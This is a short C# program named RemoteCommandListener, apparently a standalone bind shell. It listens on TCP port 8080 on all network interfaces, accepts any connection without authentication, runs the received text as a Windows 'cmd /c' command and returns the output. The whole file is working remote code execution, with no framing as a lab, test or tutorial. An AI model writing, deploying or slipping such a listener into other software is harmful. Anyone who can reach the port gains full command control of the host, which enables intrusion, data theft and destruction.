using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace RemoteCommandListener
{
    class Program
    {
        static void Main(string[] args)
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 8080);
            listener.Start();

            while (true)
            {
                Console.WriteLine("Waiting for a connection...");
                TcpClient client = listener.AcceptTcpClient();
                Console.WriteLine("Connected!");

                NetworkStream stream = client.GetStream();
                byte[] buffer = new byte[1024];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);

                Console.WriteLine(string.Format("Received command: {0}", command));

                // Execute the command
                ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = false
                };

                Process process = Process.Start(processStartInfo);
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                // Send the output back
                byte[] response = Encoding.ASCII.GetBytes(output);
                stream.Write(response, 0, response.Length);

                client.Close();
            }
        }
    }
}
